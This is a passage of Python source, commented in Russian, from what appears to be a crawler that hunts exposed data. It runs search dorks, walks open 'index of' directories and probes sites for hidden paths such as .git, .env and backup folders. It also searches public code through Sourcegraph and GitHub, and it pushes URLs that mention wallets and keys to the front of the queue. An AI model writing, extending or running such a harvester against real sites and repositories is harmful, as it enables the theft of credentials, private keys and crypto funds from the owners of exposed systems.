                    toks += _marginalia_tokens(v.get("plain") or v.get("dork") or "")
                toks = list(dict.fromkeys(toks))[:2]
                eng_variants[eng] = [{"dork": t, "plain": t} for t in toks]
            else:
                eng_variants[eng] = variants
        total_q = sum(len(v) for v in eng_variants.values())
        done = 0
        for eng in engines:
            stats = {"count": 0, "error": None, "note": None, "urls_found": 0}
            if eng in PLAIN_ONLY_ENGINES:
                stats["note"] = "Bing/Marginalia из дата-центров отбрасывают операторы — использованы ключевые слова"
            urls: list[str] = []
            for v in eng_variants[eng]:
                q = v.get("plain") if eng in PLAIN_ONLY_ENGINES else v.get("dork")
                q = q or v.get("dork") or v.get("plain") or ""
                if not q:
                    continue
                try:
                    res = SERPS[eng](q, 15)
                except Exception as e:  # noqa: BLE001
                    res = {"urls": [], "error": f"{type(e).__name__}"}
                urls += res["urls"]
                if res["error"]:
                    stats["error"] = res["error"]
                done += 1
                prog(f"Поиск: {eng} — запрос {done}/{total_q}", done, total_q)
            urls = list(dict.fromkeys(urls))
            stats["urls_found"] = len(urls)
            stats["count"] = _fetch_serp_pages(
                urls, store, max_pages, max_files, prog, "Загрузка находок",
                walk_depth=max(0, min(int(params.get("depth", 1) or 0), 3)))
            result["sources"][eng] = stats

    elif mode == "indexof":
        # Режим «Открытые каталоги (index of)»: прямые ссылки на листинги +
        # поиск листингов через SERP (intitle:"index of" …), затем обход каждого
        # каталога: файлы докачиваются, подкаталоги раскрываются до depth.
        raw_urls = params.get("urls") or []
        if isinstance(raw_urls, str):
            raw_urls = re.split(r"[\s,;]+", raw_urls)
        # прямые ссылки указывает сам пользователь — доверенные (можно LAN/localhost);
        # всё, что найдено через SERP, идёт через обычный SSRF-фильтр
        roots = [u.strip() for u in raw_urls
                 if str(u).strip().startswith(("http://", "https://"))]
        keywords = [str(k).strip() for k in (params.get("keywords") or [])
                    if str(k).strip()][:8]
        engines = [e for e in (params.get("engines") or ["bing"]) if e in SERPS] or ["bing"]
        depth = max(0, min(int(params.get("depth", 2) or 0), 3))
        max_listings = max(1, min(int(params.get("max_urls", 15)), 60))
        max_files = max(3, min(int(params.get("max_files", 40)), 120))
        budget = max_files * 4      # суммарный лимит загрузок режима

        src: dict = {"roots": len(roots), "keywords": len(keywords),
                     "listings_found": 0, "walked": {}, "error": None}
        candidates: list[str] = list(dict.fromkeys(roots))

        # SERP-фаза: по каждому ключевому слову ищем листинги; прямой dork дают
        # локальные движки, Bing/Marginalia из дата-центров получают plain-вариант
        if keywords:
            for eng in engines:
                queries = keywords[:2] if eng == "marginalia" else keywords
                for i, kw in enumerate(queries):
                    q = f'"index of" {kw}' if eng in PLAIN_ONLY_ENGINES else f'intitle:"index of" {kw}'
                    try:
                        res = SERPS[eng](q, 15)
                    except Exception as e:  # noqa: BLE001
                        res = {"urls": [], "error": f"{type(e).__name__}"}
                    src["error"] = res.get("error") or src["error"]
                    candidates += res["urls"]
                    prog(f"Поиск каталогов: {eng} — {i + 1}/{len(queries)}",
                         i + 1, max(1, len(queries)))
        # приоритизация кандидатов и лимит: сначала то, где в URL есть ключевые слова
        candidates = sorted(dict.fromkeys(candidates), key=_url_priority_score, reverse=True)
        candidates = [c for c in candidates if c not in roots][: max(0, max_listings - len(roots))]
        candidates = roots + candidates
        src["listings_found"] = len(candidates)

        fetched_total = 0
        for i, u in enumerate(candidates):
            if fetched_total >= budget:
                break
            w = walk_index_of(u, store, depth=depth,
                              max_items=min(120, budget - fetched_total),
                              prog=prog, label=f"Каталог {i + 1}/{len(candidates)}",
                              allow_private=u in roots)
            fetched_total += int(w["fetched"])
            src["walked"][u] = {k: w[k] for k in ("listings", "dirs", "files", "errors", "fetched")}
            prog(f"Каталоги index of: {i + 1}/{len(candidates)} пройдено", i + 1, len(candidates))
        src["fetched"] = fetched_total
        result["sources"]["indexof"] = src

    elif mode == "hidden":
        # Режим «Скрытые папки»: перебор типовых скрытых путей (.git, .env,
        # backup/…) на указанных сайтах. Найденные листинги обходятся целиком,
        # файлы идут в общий конвейер; найденное — в статистику источника.
        raw_urls = params.get("urls") or []
        if isinstance(raw_urls, str):
            raw_urls = re.split(r"[\s,;]+", raw_urls)
        roots = [normalize_site_root(str(u)) for u in raw_urls]
        roots = list(dict.fromkeys(u for u in roots if u))[:_HIDDEN_MAX_SITES]
        depth = max(0, min(int(params.get("depth", 2) or 0), 3))
        max_files = max(3, min(int(params.get("max_files", 40)), 150))
        budget = max_files * 3      # суммарный лимит загрузок режима

        src: dict = {"roots": len(roots), "probed": 0, "hits": 0, "walked": {},
                     "error": None if roots else "не указан ни один сайт"}
        found: list[str] = []
        fetched_total = 0
        for i, u in enumerate(roots):
            if fetched_total >= budget:
                break
            h = probe_hidden_paths(u, store, depth=depth,
                                   max_items=min(120, budget - fetched_total),
                                   prog=prog, label=f"Скрытые папки {i + 1}/{len(roots)}",
                                   allow_private=True)
            fetched_total += int(h.get("fetched", 0))
            src["probed"] += int(h.get("probed", 0))
            hits = h.get("hits") or {}
            src["hits"] += len(hits)
            src["walked"][u] = {"probed": h.get("probed", 0), "hits": hits,
                                "listings": h.get("listings", 0),
                                "files": h.get("files", 0),
                                "fetched": h.get("fetched", 0),
                                "errors": h.get("errors", 0)}
            if h.get("error"):
                src["error"] = f"{u}: {h['error']}"
            found += [f"{url} — {what}" for url, what in hits.items()]
            prog(f"Скрытые папки: {i + 1}/{len(roots)} сайтов", i + 1, max(1, len(roots)))
        src["fetched"] = fetched_total
        src["found"] = found[:100]
        src["count"] = src["hits"]
        result["sources"]["hidden"] = src

    elif mode == "keywords":
        # Обычный веб-поиск по ключевым словам — веб-фаза классического краулера.
        # Краулер больше не зациклен на картинках: те же запросы уходят в текстовые
        # SERP, страницы и файлы из выдачи (txt/json/pdf/zip) — в строковый анализ.
        keywords = [str(k).strip() for k in (params.get("keywords") or [])
                    if str(k).strip()][:10]
        engines = [e for e in (params.get("engines") or ["bing"]) if e in SERPS] or ["bing"]
        max_pages = max(3, min(int(params.get("max_pages", 10)), 30))
        max_files = max(3, min(int(params.get("max_files", 24)), 60))

        for eng in engines:
            stats: dict = {"count": 0, "error": None, "urls_found": 0}
            # Marginalia троттлит публичный ключ — не более двух запросов за джобу
            queries = keywords[:2] if eng == "marginalia" else keywords
            urls: list[str] = []
            for i, kw in enumerate(queries):
                try:
                    res = SERPS[eng](kw, 15)
                except Exception as e:  # noqa: BLE001
                    res = {"urls": [], "error": f"{type(e).__name__}"}
                urls += res["urls"]
                if res["error"]:
                    stats["error"] = res["error"]
                prog(f"Веб-поиск: {eng} — запрос {i + 1}/{len(queries)}",
                     i + 1, max(1, len(queries)))
            # приоритизация: URL со словами про кошельки/ключи — наверх очереди
            urls = sorted(dict.fromkeys(urls), key=_url_priority_score, reverse=True)
            stats["urls_found"] = len(urls)
            if not urls and not stats["error"]:
                stats["error"] = f"{SERP_LABELS.get(eng, eng)}: выдача пуста"
            stats["count"] = _fetch_serp_pages(
                urls, store, max_pages, max_files, prog, f"Веб-поиск: {eng} — загрузка",
                walk_depth=max(0, min(int(params.get("depth", 1) or 0), 3)))
            result["sources"][eng] = stats

    elif mode == "commoncrawl":
        mask = str(params.get("mask", "")).strip()
        max_urls = max(5, min(int(params.get("max_urls", 60)), 400))
        prog("Запрос к индексу Common Crawl…", 0, 1)
        try:
            res = commoncrawl_list(mask, max_urls)
        except requests.RequestException as e:
            res = {"index": None, "items": [], "error": f"{type(e).__name__}: index.commoncrawl.org недоступен"}
        result["sources"]["commoncrawl"] = {
            "count": len(res["items"]), "index": res["index"], "error": res["error"],
            "note": None if res["items"] else "index.commoncrawl.org недоступен с этого сервера; на локальной машине обычно работает",
        }
        cc_depth = max(0, min(int(params.get("depth", 0) or 0), 2))
        rec = _fetch_with_recursion(
            [{"url": it["url"], "ts": ""} for it in res["items"]],
            build_url=lambda it: it["url"],
            depth=cc_depth, budget=min(max_urls, 120),
            store=store, prog=prog, label="Загрузка",
        )
        if cc_depth > 0:
            result["sources"]["commoncrawl"]["recursion"] = rec

    elif mode == "github":
        presets = params.get("presets") or []
        custom = str(params.get("custom", "") or "").strip()
        queries: list[str] = []
        for p in presets:
            queries += list(GITHUB_PRESETS.get(p, {}).get("queries", []))
        if custom:
            queries.append(custom)
        queries = list(dict.fromkeys(queries))[:8]
        token = str(params.get("token", "") or "").strip()
        max_files = max(3, min(int(params.get("max_files", 20)), 60))

        # Sourcegraph — анонимный поиск по публичному коду (работает без токена
        # и из дата-центров); GitHub API подключается только при наличии токена.
        sg_files: dict[str, dict] = {}
        gh_files: dict[str, dict] = {}
        sg_errs: list[str] = []
        gh_errs: list[str] = []
        for i, q in enumerate(queries):
            res = sourcegraph_search(q, 30)
            for f in res["files"]:
                sg_files.setdefault(f["raw"], f)
            if res["error"]:
                sg_errs.append(res["error"])
            if token:
                try:
                    res2 = github_search(q, token, 30)
                except Exception as e:  # noqa: BLE001
                    res2 = {"files": [], "error": f"{type(e).__name__}"}
                for f in res2["files"]:
                    gh_files.setdefault(f["raw"], f)
                if res2["error"]:
                    gh_errs.append(res2["error"])
            prog(f"Поиск кода: запрос {i + 1}/{len(queries)}", i + 1, len(queries))

        def _src_err_note(errs: list[str], files: dict) -> tuple[str | None, str | None]:
            """Ошибки отдельных запросов не перекрывают успешный поиск: если файлы
            есть — уходим в note, error только при полном нуле."""
            joined = "; ".join(errs[:2]) if errs else None
            return (joined, None) if not files else (None, joined)

        sg_err, sg_note = _src_err_note(sg_errs, sg_files)
        result["sources"]["sourcegraph"] = {
            "count": len(sg_files), "queries": len(queries),
            "error": sg_err, "note": sg_note,
        }
        if token:
            gh_err, gh_note = _src_err_note(gh_errs, gh_files)
            result["sources"]["github"] = {
                "count": len(gh_files), "queries": len(queries),
                "error": gh_err, "note": gh_note,
            }
        else:
            result["sources"]["github"] = {
                "count": 0, "queries": len(queries),
                "note": "GitHub API требует токен — выполнен анонимный поиск Sourcegraph",
            }
        all_files = dict(sg_files)
        for f in gh_files.values():
            all_files.setdefault(f["raw"], f)
        done = 0
        for f in list(all_files.values())[:max_files]:
            _fetch_item(f["raw"], store)
            done += 1
            if done % 5 == 0 or done == max_files:
                prog(f"Скачивание файлов GitHub: {done}", done, max_files)

    store.write_manifest(job_dir)
    result["images"] = store.counters["images"]
    result["docs"] = store.counters["docs"]
    result["pages"] = store.counters["pages"]
    result["total"] = store.counters["images"] + store.counters["docs"]
    result["blocked"] = store.counters["blocked"]
    result["skipped"] = store.counters["skipped"]
    return result
